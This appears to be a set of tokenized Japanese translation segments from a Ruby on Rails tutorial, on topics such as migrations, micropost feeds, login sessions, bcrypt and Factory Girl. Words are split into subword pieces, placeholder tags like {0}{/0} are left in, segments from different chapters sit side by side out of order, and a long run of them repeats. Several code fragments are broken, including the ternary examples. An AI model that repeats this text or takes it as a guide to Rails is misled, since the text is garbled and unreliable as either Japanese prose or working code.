▁リスト \ ref { code : un i c or n _ config } では 少し だけ コードの 見 栄 え を 修正 しています 。 これは 標準的な 1 行 8 0 文字 の 制限 に 合わせ るため の 変更 です 。
▁なお 、 この \ ko de { Proc file } は ルート ディレクトリ ▁(\ ko de { Gemfile } と同じ ディレクトリ ) ▁ に 置 い ておく 必要がある ので 、 ファイルの 置き場所 には 注意 してください 。
▁ここで いつものように 、 マイグレーション を実行して \ ko de { admin } 属性 を追加しましょう 。 コマンドライン で 、 この 属性 の 型 を \ ko de { boolean } と 指定 します 。
▁\ ko de { gravatar _ for } ヘルパー 用の オプション の \ ko de { : size } パラメータ ー を定義する 。
▁\ ko de { _ user . html . erb } パーシャル を使って 自動的に \ ko de {@ users } 変数 内の それぞれの ユーザーを 出力 していました 。
▁ 今回の 場合は 、 ユーザー コントローラの コンテキスト において 、\ emph { マイクロポスト } を ページネーション したい ため 、 明示的に \ ko de {@ microposts } 変数 を \ ko de { ▁ will _ paginate } に 渡す 必要があります 。
▁ この場合 の \ ko de { id } 属性 は 単なる 整 数 ▁( す な わ ち \ ko de { self . id } は ユーザーの id ) ▁ である ため 危 険 はありません が 、 SQL 文 に インクルード される 変数 を \ emph { 常に } エスケープ する 習慣 は ぜ ひ 身 に つ け てください 。
▁このとき 、\ ko de {@ feed _ item s } の 各 要素 が \ ko de { Micropost } クラス を 持 って いた ため 、 Rails は Micropost の パーシャル の 呼 び 出 す ことができ ました 。
▁\ ko de { {1} リスト 2 . 9 {/1} } の内容 は 、 {2} Users Controller {/2} が {2} Microposts Controller {/2} に置き 換 わ っている ほ か は \ emph { {1} リスト 2 . 4 {/1} } と { 4 } 完全に 同 一 {/4} である 点 にご注目ください 。
▁ テキストエディタ か IDE を使用して \ ko de { app / models / micropost . rb } を 開 き 、 ▁ {1}{2} リスト 2.1 0 {/2}{/1} の内容 に置き換え ます 。
▁\ ko de { ActiveRecord :: Base } クラス を継承し た こと によって 、 作成した モデル オブジェクトは データベース にアクセス できるように なり 、 データベースの カラム を あ た か も Ruby の 属性 のように 扱 え る ようになります 。
▁ これはリスト \ ref { code : layout _ flash } で使用されていま した 。
▁ これはリスト \ ref { code : flash _ test } で使用されていま した 。
▁ 上 で説明した ことを User モデルに 実装 すると リスト \ ref { code : before _ create _ activation _ digest } のようになります 。
▁ 次の \ ref { sec : activat ing _ the _ account } で テストを もう少し 追加 し 、 リファクタリング を 少々 施 せ ば 完了 です 。
▁ 配列 \ ko de { deliver ies } は グ ロー バ ル なので 、\ ko de { setup } メソッドで これを 初期化 して お か ない と 、 並 行 して 行 わ れる 他の テスト で メール が 配信 された ときに エラー で 中 断 し てしまいます ▁(\ ref { sec : password _ reset _ test } でも 似 た 事 例 を ご 紹 介 します )。
▁ 表 { p 0} で示した {2} edit _ user _ path {/2} という 名前付きルート と 、 ▁リスト \ ref { code : current _ user _ working } で定義した {2} current _ user {/2} という ヘルパーメソッド を使うと 、 実装 が 簡単 です 。
▁リスト \ ref { code : s end g r id _ config } の メール 設定 には S end G r id アカウント の \ ko de { user _ name } と \ ko de { password } 設定 を 記 入 する 行 もあります が 、 そこ には 記 入 せ ず 、 必ず 環境変数 「\ ko de { ENV }」 に設定する よう 十分 ご注意ください 。
▁ これはリスト \ ref { code : password _ reset _ expir e _ test } で使用されていま した 。
▁ これはリスト \ ref { code : g en er al _ authenticated _ p } で使用されていま した 。
▁ 話 を 戻 して 、 Bootstrap の 変数 の 一覧 表 を見ると 、 薄 い 灰 色 に対して 以下の 変数 名 が与えられ ること に 気 が 付き ます 。
▁{0} 第 {1} 5 {/1} 章 {/0} から {2} 第 {1} 10 {/1} 章 {/2} に かけ て 、 レイアウト 、 ユーザーの データモデル 、 ユーザー登録 / 認証システム を 順に 作成 し 、 サンプルアプリケーションの 基本的な 部分を 実装します 。
▁リスト \ ref { code : footer _ css } のとき
▁ エラー ページ など 、 一 般 ( Web ブラウザ など ) に 直接 公開 する データ
▁4 2 ▁ file s ▁ change d , ▁ 8 4 6 1 ▁in s er tion s ( + ) , ▁0 ▁ de let ions ( - )
▁create ▁ mod e ▁ 100 64 4 ▁ README . rdoc
▁create ▁ mod e ▁ 100 64 4 ▁ Rake file
▁ここでは 、 Unix コマンド の \ ko de { l s } で \ ko de { app / controllers / } ディレクトリ の 中 身 を表示し た 後 、\ ko de { rm } コマンド を う っかり 実行 して この ディレクトリ を削除し て し ま った とします ▁( {1}{2} 表 1 . 1 {/2}{/1} )。
▁\ text tt { rails _ 12 factor } ▁gem が追加され て いる点に注目してください 。 これは 画像 や スタイルシート などの 静 的な アセット を 提 供 するために Heroku で 使用されます 。 [ B R ] < n > [ B R ] < n > また 、 sqlite 3 ▁gem が 本番環境 には 含 まれ ていない 点 にも 注目してください 。 これは 、 今回の 本番環境 である Heroku では SQLite 3 を サポート していない ため 、 明示的に 本番環境 から sqlite 3 ▁gem を 外 す 必要があります ▁( 本番環境 に含め てしまう と 、 デプロイ 時に エラーが発生し ます )。
▁Rails には \ ko de { rails } という名前の コマンドライン コマンド があり 、\ ko de { rails ▁ new } で 新しい アプリケーションを 生成 したり 、\ ko de { rails ▁ server } で ローカル サーバー を実行し たり できる 。
▁この リレーションシップ は 今後 \ ko de { follower _ id } と \ ko de { followed _ id } で 頻繁に 検索 すること になる ので 、 リスト \ ref { code : relationships _ migration } に示したように 、 それぞれの カラム に インデックス を追加します 。
▁ 表 \ ref { table : association _ method s _ relationships } の メソッドを 参 考 に し ながら 、\ ko de { following } による 関連付け を使って \ ko de { follow }、\ ko de { unfollow }、\ ko de { following ?} メソッドを 実装 して い き ましょう ▁( リスト \ ref { code : follow _ unfollow _ following })。
▁次に 、\ ko de { followers . include ?} メソッドを使って 先ほど の データモデル を テスト していきます 。 テストコード は リスト \ ref { code : followers _ test } の とおりです 。
▁ 本チュートリアル の いた る ところで 見 てきた ように 、 Rails は 慣習 に従って 、 アクション に対応する ビュー を 暗 黙 的に 呼び出し ます 。 たとえば 、\ ko de { show } アクション の最後 で \ ko de { show . html . erb } を呼び出す といった 具 合 です 。
▁ フォロー / フォロー解除 ボタン を 動か す ためには 、 フォーム ▁( リスト { p 0} / リスト { p 2 }) ▁ から 送信された パラメータ を使って 、 {3} followed _ id {/3} に対応する ユーザー を見つけ て く る必要があります ▁ 。 その後 、 見つけ てきた ユーザー に対して 適切に {3} follow {/3} / {3} unfollow {/3} メソッド ▁( リスト \ ref { code : follow _ unfollow _ following }) ▁ を使います 。
▁ 更新 の 結果を リスト \ ref { code : follow _ form _ ajax } と リスト \ ref { code : unfollow _ form _ ajax } に示します 。
▁ 図 \ ref { fig : user _ feed } に 、 サンプル の \ ko de { microposts } データベース テーブル と 、 それ を フィード した 結果 を示します 。
▁id ▁1 の ユーザーが id ▁2 、 7 、 8 、 10 を フォロー している とき の フィード 。
▁ この時点で は もちろん 実装 はありません が 、 機能を 確認 するための テストは 作成 できます 。
▁この テスト で 重要な ことは 、 フィード に 必要な 3 つの 条件 を 満 た す ことです 。 1 ) ▁ フォローしているユーザー の マイクロポスト が フィード に 含 まれ ている こと 。 2 ) ▁ 自分自身 の マイクロポスト も フィード に 含 まれ ている こと 。 3 ) ▁\ emph { フォロー していない } ユーザーの マイクロポスト が フィード に 含 まれ ていない こと 。
▁ 最終的な 表示 が や や 込 み 入 っている ため 、 欲 張 らず に 細 か い 部品 を 1 つ ず つ 確かめ ながら 導入 することで 最終的な フィード を 実装します 。
▁ここで 必要な のは 、\ ko de { microposts } テーブル から 、 ある ユーザー ▁( つまり 自分自身 ) ▁ が フォローしているユーザー に対応する id を持つ マイクロポスト をすべて 選択 ▁( select ) ▁ することです 。
▁( 上のコード では 、 条件 部分 に \ ko de { user . id } の代わりに Rails の 習慣 である \ ko de { user } を 使用している ことに注意してください 。 Rails は このような 場合に 自動的に \ ko de { id } を使用します 。
▁ Micropost マイグレーション
▁(\ ko de { user _ id } と \ ko de { created _ at } に インデックス が与えられ ている ことに 注意 )
▁この 記 法 は 、 実際には Rails による コア Ruby 言語 の 拡 張 として 行われた の が 始 まり です 。 この 記 法 が あ まり に 便利な ので 、 後に Ruby 自身 に まで 取り 入 れ られ た ほど です 。
▁ テストスイート を実行して 確認 することもできます 。 この テストは パス するはずです 。
▁ 簡単な アプリケーション であれば 、 この 最初の 実装 だけで ほとんど の 目的 を 達 成 できる でしょう 。
▁しかし 、 私 た ち の サンプルアプリケーションの 実装 に はまだ 足 り ない もの があります 。 それ が 何 な のか 、 次の 節 に進む前に 考え て みてください
▁(\ emph { ヒント : } フォローしているユーザー が 5 000 人 も い たら どう な る でしょう か )。
▁( 実際 は どちら でも 動作します が 、 この 文 脈 では 内 挿 と 考え る 方が 筋 が 通 っています )。
▁このコードは Rails と Ruby と SQL が 複 雑 に 絡 み 合 って いて 厄 介 ですが 、 ち ゃ ん と 動作します 。
▁( もちろん 、 サブ セレクト を使用すれば い く ら でも ス ケ ー ル アップ できる など という ことはありません 。
▁ 大 規 模 な Web サイト では 、 バ ッ ク グ ラ ウ ンド ジョブ を使用して 、 フィード を 非 同 期 で 生成 する などの 対策 が 必要 でしょう 。 Web サイトの ス ケ ー リ ング のような デ リ ケ ート な 問題 は 本書 の 範 疇 を 超 え ます )。
▁( 開発 サーバー の ログ ・ ファイルに 出力 された SQL 文 を調べ ること で 、 この ことを確認 できます )。
▁ 変更 した テストを リスト \ ref { code : home _ feed _ test } に示します 。
▁ 今後 の 学習 の 手 始 め と するために 、 この節 では サンプルアプリケーションの コア 部分 の さまざまな 拡 張 方法 を 提 案 し 、 それぞれ に 必要な 学習 内容 についても 示 します 。
▁ アプリケーションの 拡 張 に 取り か か る 前に 、 まず は 現 状 の 変更を マージ しておきましょう 。
▁ 必要 であれば 、 いつものように コードを プッシュ して 展開 します 。
▁\ href { http :// rails casts . com /}{ RailsCast s } 。 強 く 推 奨 します 。 この RailsCast s の 素 晴 ら し さ については 、 ど れ ほど 言 葉 を 尽 く しても 足 り ません 。
▁最初に \ href { http :// rails casts . com / e p is odes / ar ch ive } { RailsCast s エ ピ ソ ー ド ア ー カ イ ブ } を開いて 、 目 に つ いた トピック を 適 当 に 開 く ところ から 始 め てみると よいでしょう 。
▁ 最初の ステップ として 、 マイクロポストの パーシャル ▁( リスト \ ref { code : feed _ item _ partial }) ▁ に 削除リンク を追加します 。
▁ これはリスト \ ref { code : micropost _ model _ image _ validation } で使用されていま した 。
▁ そして 、 認 証 に 必要な すべての メソッド も ここ まで に 学 んで あります ▁( そう な るように 本書 を 書いた のです )。 ここでは 、 Active ▁Record が提供する \ ko de { User . find _ by } メソッド ▁(\ ref { sec : find ing _ user _ objects }) ▁ と 、\ ko de { has _ secure _ password } が提供する \ ko de { authenticate } メソッド ▁(\ ref { sec : user _ authentication }) ▁ を使用します 。
▁リスト \ ref { code : un i ver s al _ css } の CSS の 結果 は 図 \ ref { fig : sample _ app _ un i ver s al } で 確認 できます 。
▁ 前 述 の 簡潔 な 記 法 を \ ko de { current _ user } メソッド に適用 した 結果を リスト \ ref { code : current _ user } に示します 。
▁このコードは リスト \ ref { code : header _ partial } で使用されていま した 。 もうひとつ 、
▁ ユーザーが ログイン 中 の 状態 とは 、 セッション に ユーザー が存在する 、 つまり \ ko de { current _ user } が \ ko de { nil } でない ということです 。
▁Rails ▁ 3.0 以前の バージョン では 、 静 的 ファイルは \ ko de { public / } 以下の 次の ディレクトリ に置かれ ていました 。
▁\ ko de { has _ secure _ password } で 必要となる \ ko de { password _ digest } 属性 は これ で 準備 できました が 、 ハッシュ化 されていない 生 の パスワード も 参 照 できる と 便利です 。
▁self を省略した 結果を リスト \ ref { code : user _ login _ test _ valid _ information } に示します 。
▁ アプリケーション のコードは 既に 動作する よう になっている ので 、 ここで テスト を実行すると ▁\ passing ▁ になるはずです 。
▁ アセットパイプライン を使うと 、 この 「 開発 効率 と 読み込み 時間 の どちら を 重 視 するか 」 という 問題 について 悩 む 必要 が なくなります 。
▁ セッション の \ ko de { destroy } アクション の 定義 と テストが 完成 した ので 、 つ い に 3 大 機能 である 「 ユーザー登録 / ログイン / ログアウト 」 が すべて 完成 しました 。 テストスイート は ▁\ passing ▁ になるはずです 。
▁\ ko de { self } キーワード を与える と 、 この 代入 によって ユーザーの \ ko de { remember _ token } 属性 が 期待どおり に 設定 されます
▁ 以上 の 点 を 考 慮 して 、 有効な トークン と それ に 関連する ダイジェスト を作成 できるようにします 。 具体的には 、 最初に \ ko de { User . new _ token } で 記憶トークン を作成し 、 続いて \ ko de { User . digest } を 適 用 した 結果 で 記憶ダイジェスト を更新し ます 。 \ ko de { remember } メソッドの 更新 結果を リスト \ ref { code : user _ model _ remember } に示します 。
▁self を省略した 結果を リスト \ ref { code : remember _ me _ css } に示します 。
▁さらに 申 し 上 げ ると 、 この種の 永続的 セッション を 手動で 確認 する のは 非常に 面倒 なので 、\ ko de { current _ user } を リファクタリング する のであれば ▁( {1} 第 {2} 10 {/2} 章 {/1} で 行う 予定です ) ▁ 同時に テスト も 作成 しておくこと が 重要です 。
▁self を省略した 結果を リスト \ ref { code : persisten t _ sessions _ test } に示します 。
▁作成した コードをリスト \ ref { code : log _ out _ with _ _ c lo s e _ browser } に示します
▁self を省略した 結果を リスト \ ref { code : c lo s e _ route } に示します 。
▁ これはリスト \ ref { code : _ c lo s e _ browser } で使用されていま した 。
▁ これはリスト \ ref { code : c lo s e _ route } で使用されていま した 。
▁最後に 、 {0}{1} 第 10 章 {/1}{/0} で メールアドレス を使って アカウントを有効化する 方法 と 、 パスワードを リセット する方法について 学 び ます 。
▁ まとめ ると 、 {0}{1} 第 6 章 {/1}{/0} から {2} {1} 第 10 章 {/1} {/2} を通して 、 Rails の ログイン と 認証システム を ひ と とおり 開発 します 。
▁( 最初の 行 は master ブランチ から 作業 を 始 め る ことを確認する ためのものです 。 そして 、\ ko de { modeling - users } トピックブランチ は \ ko de { master } ブランチ を 基 に 作成 します 。
▁ メールアドレスを ユーザー名 に した ことで 、 ユーザー 同士 で 通 信 できるように 拡 張 できる 可能性 が 開 か れ ます ▁( {0}{1} 第 10 章 {/1}{/0} )。
▁ マイグレーション 自体 は 、 データベースに 与え る 変更を 定義 した \ ko de { change } メソッドの 集 まり です 。
▁その ブロック の中で \ ko de { create _ table } メソッドは \ ko de { t } オブジェクト を使って 、\ ko de { name } と \ ko de { email } カラム を データベースに 作り ます 。 型 は どちら も \ ko de { string } です
▁ ブロック の 最後の 行 \ ko de { t . timestamp s } は 特別な コマンドで 、\ ko de { created _ at } と \ ko de { updated _ at } という 2 つの 「\ emph { マ ジ ッ ク カラム }」 を作成します 。 これらは 、 ある ユーザーが 作成 または 更新 された ときに 、 その 時刻 を 自動的に 記 録 する タイムスタンプ です
▁もちろん 、 この 継 承 の 知 識 は 、\ ko de { ActiveRecord :: Base } に含まれる メソッド など について 知 ら なければ 何 の 役 にも 立 ち ません 。 それらの 知 識 の一部 について これ から 説明します 。
▁しかし 例外 が 重要な もの であること も 確 か なので 、\ ref { sec : comments _ for _ v ar io us _ reader s } で 推 薦 した Ruby 本 で 例外 について 詳 しく 学ぶ ことを お す す め します
▁=> ▁[ # < User ▁id : ▁1, ▁name : ▁" Michael ▁Hartl ", ▁ email : ▁" mhartl @ example . com ",
▁\ ko de { user . save } を実行し た ことで ユーザーが 更新 できました 。 \ ref { sec : creat ing _ user _ objects } で 約 束 した ように 、 マ ジ ッ ク カラム の 更新 日 時 も 更新 されています 。
▁ 属性 を更新する もうひとつ の 方法は 、\ ko de { update _ attributes } を使う ものです 。
▁ 特定の 属性 のみ を更新する 必要がある 場合は 、 以下のように \ ko de { update _ attribute } を 単 発 で 使用 して 制限 を 回 避 する必要があります 。
▁なお 、\ ko de { created _ at } カラム は 、\ ref { sec : order ing _ and _ dependency } や \ ref { sec : a ug m ent ing _ the _ user _ show _ page } の実装 を 進め て い く 上で 必要な カラム です 。
▁end
▁ 一度 正しい 関連付け を定義し て し ま えば 、\ ko de {@ micropost } 変数 の \ ko de { user _ id } には 、 関連する ユーザ の id が自動的に 設定 されます 。
▁ データベースから ユーザーの マイクロポストを 読み 出 す \ ko de { user . microposts } メソッドは 、 デフォルトで は 読み出し の 順序 に対して 何も 保 証 しません が 、 ▁ ブログ や Twitter の 慣習 に従って 、 作成 時間 の 逆 順 、 つまり 最も 新しいマイクロポスト を 最初に 表示する ように してみましょう 。
▁これで テストにパス するはずです 。
▁この コレクション を 作る ために 、 以下の コンソール セッション に示した ような 、 文字列 の配列 を簡単に 作 れる \ ko de { % w [ ]} という 便利な テクニック を 知 っ ておく と 良い でしょう 。
▁上のコード の中に ある 以下の \ ko de { dependent : ▁: destroy } オプションは 、
▁ユーザー 自体 が 破 棄 された ときに 、 その ユーザーに 依 存 する マイクロポスト ▁( つまり 特定の ユーザーの もの ) ▁ も 破 棄 される ことを 指定 しています 。
▁\ ko de { paginate } メソッドの 素 晴 ら し さ に 注目してください 。 マイクロポストの 関連付け を経由して \ text tt { micropost } テーブル に 到 達 し 、 必要な マイクロポストの ページを 引 き 出 してくれます 。
▁ 代わりに 、 特 定 \ ko de { user _ id } に対する マイクロポストの 数 を データベースに 問 い 合わせ ます 。
▁ それ でも count メソッドが アプリケーションの ボ ト ル ネ ッ ク になる ようなこと があれば 、 さらに 高速 な \ href { http :// rails casts . com / e p is odes / 23 - counter - cache - column }{\ emph { counter ▁ cache } } を使う こともできます 。
▁\ ref { sec : a ug m ent ing _ the _ user _ show _ page } のユーザー マイクロポストの テンプレート 作成 作業 の 成 果 は 、 何 とも 拍 子 抜 け で した 。
▁ 一意性 の 警 告
▁ この問題 を避ける ために 、 今回は 「 データベースに保存 される 直 前に すべての 文字列を 小文字 に変換 する 」 という 対策 を 採 ります 。 例 えば “ F oo @ E x A M P le . Co M ” という 文字列 が与えられ たら 、 保存 する 直 前に “ foo @ example . com ” に変換 し てしまいます 。
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api . rubyonrails . org / v 4.1 . 5 / classes / ActiveRecord / Callbacks . html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を 読んで みてください 。
▁( 本チュートリアルで 初めて 紹 介 した テクニック ですが 、 この テクニック については 第 10 章 で もう一度 取り上げ ます 。 そこで は コールバック を定義する ときに { 0} メソッド を参照 する {/0} という 慣習 について説明し ます 。 ) {1} \ emph { }{/1}
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁end
▁次に 、 マイクロポストの \ ko de { create } アクション を 作り 始 め ましょう 。 この アクション も 、 リスト \ ref { code : user _ create _ action } のユーザー 用 アクション と似ています 。 違 い は 、 新しいマイクロポスト を \ ko de { build } するために user / micropost 関連付けを 使用している 点 です ▁( リスト \ ref { code : microposts _ create _ action })。
▁\ ko de { micropost _ params } で S trong ▁Parameters を 使用している ことにより 、 マイクロポストの コンテンツ だけ が Web 経由で 編集 可能 になっている ことに注目してください 。
▁{0} 図 6 . 5 {/0} {1} User モデルに \ ko de { password _ digest } 属性 を追加する 。 {/1}
▁ マイグレーション 名 は 自由に 指定できます が 、 上の ように 末尾 を \ ko de { to _ users } に しておく ことをお勧めします 。 こう しておく と 、\ ko de { users } テーブル に カラム を追加する マイグレーション が Rails によって自動的に 作成される からです 。
▁ else
▁リスト { p 0} で {2} users {/2} テーブル を 最初に 生成 する とき 、 {2} name : string {/2} や {2} email : string {/2} といった 引数 を与えて いた ことを思い出してください 。
▁その とき と同様に \ ko de { password _ digest : string } という 引数 を与える ことで 、 完全な マイグレーション を生成する ための 十分 な 情報を Rails に 与え ることができます ▁( リスト \ ref { code : password _ migration })。
▁This ▁is ▁the ▁ home ▁ page ▁for ▁the
▁ sample ▁ application .
▁ サンプルアプリケーション で bcrypt を使用する ために 、\ ko de { bcrypt - ruby } ▁gem を \ ko de { Gemfile } に追加します ▁( リスト \ ref { code : bcrypt _ ruby })。
▁\ ko de { bcrypt - ruby } を \ ko de { Gemfile } に追加する 。
▁< span >
▁\ ko de { f . object } は \ ko de {@ micropost } となります 。
▁ パーシャル に オブジェクトを 渡す ために 、 値が オブジェクト で 、 キー が パーシャル で の 変数 名 と同じ ハッシュ を 利用 します 。 これ で 、 以下のコード が 完成 します 。
▁ 言 い 換 え ると 、\ ko de { object : ▁f . object } は \ ko de { error _ messages } パーシャル の中で \ ko de { object } という 変数 名 を作成します 。
▁self を省略した 結果を リスト \ ref { code : updated _ error _ messages _ partial } に示します 。
▁また 、 User モデルに \ ko de { has _ secure _ password } を追加した 効果 についても ▁( たとえば \ ko de { authenticate } メソッドの 効果 など も ) ▁ 具 体 的に 見 ていきます 。
▁\ href { http :// guides . rubyonrails . org / active _ record _ query ing . html } { where } や li ke の詳細については 、 Rails ▁ G u id e の 「\ ko de { Active ▁Record ▁ Query ▁ In ter fa ce { } / } ▁( 英語 )」 を参照してください 。
▁\ ko de { has _ secure _ password } メソッド を使う ことで 、 モデル に対して セキュア な パスワード を追加する ことができる
▁ 残 念 ですが 、 この場合は ページ 分割 された フィード を返し ても うまく 動 き ません 。
▁ 動か ない 理由 を 確認 したい 方は 、 実際に 実装 して ページネーション リンクを クリック してみてください 。
▁このコードは リスト \ ref { code : micropost _ partial _ with _ delete } で使用されていま した 。 もうひとつ 、
▁\ ko de { correct _ user } ▁ before _ action では 、 マイクロポストを 以下のように 関連付けを \ emph { 経 由 して } 見つけ ていることに注目してください 。
▁ これはリスト \ ref { code : a _ test _ for _ invalid _ submission } で使用されていま した 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁self を省略した 結果を リスト \ ref { code : micropost _ create _ image _ upload } に示します 。
▁self を省略した 結果を リスト \ ref { code : micropost _ partial _ image _ d is p la y } に示します 。
▁ これはリスト \ ref { code : micropost _ model _ image } で使用されていま した 。
▁self を省略した 結果を リスト \ ref { code : micropost _ model _ image _ validation } に示します 。
▁self を省略した 結果を リスト \ ref { code : c ar ri er _ w a ve _ config ur ation } に示します 。
▁この 世 には 10 種類 の 人 々 が います 。 3 項 演算子 を 好 き な 人 、 嫌 い な 人 、 3 項 演算子 を 知 らない 人 です 。
▁if ▁ boolean ?
▁ 論理値 ? ▁ ?
▁また 、 3 項 演算子 で 代入 文 を 置き換え る こともできます 。
▁ v ar ▁= ▁ boolean ? ▁ ?
▁ 他 に 、 関数 の 戻り値 で使用する ことも よく あります 。
▁def ▁ foo
▁do _ st u f f
▁ boolean ? ▁ ?
▁Ruby は 暗 黙 的に 関数 の 最後の 式 の値 を返す ので 、 ここでは \ text tt { foo } メソッドは \ text tt { boolean ?} の値 によって \ text tt { " bar "} または \ text tt { " baz "} を返します 。
▁ 長 い 単 語 を ラ ッ プ させる ヘルパー 。
▁self を省略した 結果を リスト \ ref { code : edit _ tests _ logged _ in } に示します 。
▁ これはリスト \ ref { code : edit _ update _ w r on g _ user _ tests } で使用されていま した 。
▁さらに あり が たい ことに 、 base 64 は URL を 安全 に エスケープ するために も 用 い られ る ▁(\ ko de { url safe _ base 64 } という名前の メソッド がある こと から も わかり ます ) ▁ ので 、 base 64 を 採 用 すれば 、 {1} 第 {2} 10 {/2} 章 {/1} で アカウント の 有効化 の リンク や パスワード リセット の リンク でも 同じ トークン ジェネレータ を使用 できるようになります 。
▁なお 、 必要な gem は ここ まで で すべて インストール した ので 、 今後 の 章では 新 た な gem は 追加 しません 。
▁{0}{1} 第 10 章 {/1}{/0} では 、 ▁ メールアドレス が \ emph { 本当に } 有効 であることを 確かめ るために 、\ emph { アカウントを有効化する } 機能を サインアップ の 手順 に追加します 。
▁このコードは リスト \ ref { code : user _ pages _ spec } で使用されていま した 。 もうひとつ 、
▁ これはリスト \ ref { code : initial _ signup _ test } で使用されていま した 。
▁最初に 行った User ページ spec の 再 現 。
▁# ▁ユーザー 変数 を作成する ための コード に置き換え る 。
▁これ より コメント の 部分 に 適切な コード を追加します 。
▁これにより 、 ページの コンテンツ と タイトル の 両方 に ユーザーの 名前 が含まれ ている かどうかを テスト できます 。
▁ 必要な User モデル オブジェクト を作成する ために 、 Active ▁Record を使用して \ ko de { User . create } という 形式 で ユーザー を作成する こともできます が 、 経験 上 、 ユーザーの オブジェクトを 定義 して それ を データベースに 挿 入 するには 、 ユーザーの \ emph { ファクトリー ▁( factor y ) } ▁ を使用する 方が は る か に 便利です 。
▁ここでは 、\ href { http :// github . com / thoughtbot / factor y _ g ir l } { Factory ▁Girl } を使用して 生成 した ファクトリー を使用します 。 Factory ▁Girl は 、\ href { http :// thoughtbot . com /}{ thoughtbot } の メンバ ー が 作成した Ruby ▁gem です 。
▁ Factory ▁Girl は 、 RSpec を使用して Ruby で 「 ドメイン 特 化 言語 ▁( do main - spec if i c ▁ lang u age )」 を定義し ます 。 ここでは 、 Active ▁Record の オブジェクトの 定義 に 特 化 しています 。
▁この ドメイン 特 化 言語 の 文法 は シ ン プ ル で 、 必要な オブジェクトの 属性 を定義する ために Ruby の ブロック と カスタム メソッド を使用しています 。
▁ この章 の サンプルアプリケーション では 、 Active ▁Record の メ リ ッ ト はまだ は っ き り とは わ から ない かもしれませんが 、 この後 の 章では ファクトリー の 機能を さらに 活用 する 予定です 。
▁( Factory ▁Girl は テスト 環境で しか 使用 し ないので 、 以下のように \ ko de { : test } グループ に追加します )。
▁\ ko de { Gemfile } に Factory ▁Girl を追加する 。
▁ これはリスト \ ref { code : user _ factor y } で使用されていま した 。
▁User モデル オブジェクトを シ ミ ュ レ ート するための ファクトリー 。
▁ シンボル \ ko de { : user } が \ ko de { factor y } コマンド に渡され ると 、 Factory ▁Girl は それ に 続 く 定義 が User モデル オブジェクトを 対象 と している ことを 認 識 します 。
▁ これはリスト \ ref { code : user _ show _ page _ test } で使用されていま した 。
▁ この時点で 以下 を実行すると 、 テストスイート が 赤 色 ▁( 失敗 ) ▁ になるはずです 。
▁ これはリスト \ ref { code : name _ title _ and _ head ing } で使用されていま した 。
▁ユーザーの プロファイル ページに タイトル と 見 出 し を追加する 。
▁{0}{1} 第 10 章 {/1}{/0} では 、 ▁ メールアドレス が \ emph { 本当に } 有効 であることを 確かめ るために 、\ emph { アカウントを有効化する } 機能を サインアップ の 手順 に追加します 。
▁ただし 、 今 はまだ \ ko de { app / views / shared } といった ディレクトリ は 作 って い ないので 、 表 \ ref { table : un i x _ command _ line } で紹介した \ ko de { m k d ir } コマンド を 使い 、 新しく ディレクトリ を 作成する必要があります 。
▁ フォーム 送信 をテストする ためには 、 ▁\ text tt { users _ path } に対して \ ko de { POST } リクエストを 送信 する必要があります ▁( 表 \ ref { table : table - RESTful _ users })。 これは 、 次のように \ text tt { post } 関数 を使って 実現 できます
▁{0}{1} 第 10 章 {/1}{/0} では 、 ▁ メールアドレス が \ emph { 本当に } 有効 であることを 確かめ るために 、\ emph { アカウントを有効化する } 機能を サインアップ の 手順 に追加します 。
▁このコードは リスト \ ref { code : user _ pages _ spec } で使用されていま した 。 もうひとつ 、
▁ これはリスト \ ref { code : initial _ signup _ test } で使用されていま した 。
▁最初に 行った User ページ spec の 再 現 。
▁# ▁ユーザー 変数 を作成する ための コード に置き換え る 。
▁これ より コメント の 部分 に 適切な コード を追加します 。
▁これにより 、 ページの コンテンツ と タイトル の 両方 に ユーザーの 名前 が含まれ ている かどうかを テスト できます 。
▁ 必要な User モデル オブジェクト を作成する ために 、 Active ▁Record を使用して \ ko de { User . create } という 形式 で ユーザー を作成する こともできます が 、 経験 上 、 ユーザーの オブジェクトを 定義 して それ を データベースに 挿 入 するには 、 ユーザーの \ emph { ファクトリー ▁( factor y ) } ▁ を使用する 方が は る か に 便利です 。
▁ここでは 、\ href { http :// github . com / thoughtbot / factor y _ g ir l } { Factory ▁Girl } を使用して 生成 した ファクトリー を使用します 。 Factory ▁Girl は 、\ href { http :// thoughtbot . com /}{ thoughtbot } の メンバ ー が 作成した Ruby ▁gem です 。
▁ Factory ▁Girl は 、 RSpec を使用して Ruby で 「 ドメイン 特 化 言語 ▁( do main - spec if i c ▁ lang u age )」 を定義し ます 。 ここでは 、 Active ▁Record の オブジェクトの 定義 に 特 化 しています 。
▁この ドメイン 特 化 言語 の 文法 は シ ン プ ル で 、 必要な オブジェクトの 属性 を定義する ために Ruby の ブロック と カスタム メソッド を使用しています 。
▁ この章 の サンプルアプリケーション では 、 Active ▁Record の メ リ ッ ト はまだ は っ き り とは わ から ない かもしれませんが 、 この後 の 章では ファクトリー の 機能を さらに 活用 する 予定です 。
▁( Factory ▁Girl は テスト 環境で しか 使用 し ないので 、 以下のように \ ko de { : test } グループ に追加します )。
▁\ ko de { Gemfile } に Factory ▁Girl を追加する 。
▁ これはリスト \ ref { code : user _ factor y } で使用されていま した 。
▁User モデル オブジェクトを シ ミ ュ レ ート するための ファクトリー 。
▁ シンボル \ ko de { : user } が \ ko de { factor y } コマンド に渡され ると 、 Factory ▁Girl は それ に 続 く 定義 が User モデル オブジェクトを 対象 と している ことを 認 識 します 。
▁ これはリスト \ ref { code : user _ show _ page _ test } で使用されていま した 。
▁ この時点で 以下 を実行すると 、 テストスイート が 赤 色 ▁( 失敗 ) ▁ になるはずです 。
▁ これはリスト \ ref { code : name _ title _ and _ head ing } で使用されていま した 。
▁ユーザーの プロファイル ページに タイトル と 見 出 し を追加する 。
▁このとき 、 URL が \ text tt { https :// } に 変 わ って いて 、 アドレス バー に 鍵 ア イ コ ン が表示されている ことに も 注目してください ▁( 図 \ ref { fig : signup _ failure _ mockup })。 これは 先ほど 設定 した SSL が うまく 動 い ている ことを 示 しています 。
▁最後に 、 認 可 ▁( author i z ation ) ▁ のための メソッドを アクション に追加 し 、 Web サイト が セキュリティ モデル に従う ようにします 。
